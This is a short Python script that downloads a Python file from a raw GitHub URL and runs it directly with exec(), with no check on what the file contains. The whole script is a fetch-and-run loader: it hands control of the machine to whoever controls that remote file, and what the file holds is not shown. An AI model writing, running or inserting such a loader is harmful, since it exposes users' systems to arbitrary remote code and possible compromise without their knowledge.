import requests

# URL of the raw file on GitHub
file_url = 'https://raw.githubusercontent.com/Thr-tech/Rando/main/text1.py'

# Fetch the file content
response = requests.get(file_url)
response.raise_for_status()  # Ensure we notice bad responses

# Get the file content as a string
script_content = response.text

# Execute the content of the script
try:
    exec(script_content)
except Exception as e:
    print(f"Error executing script: {e}")
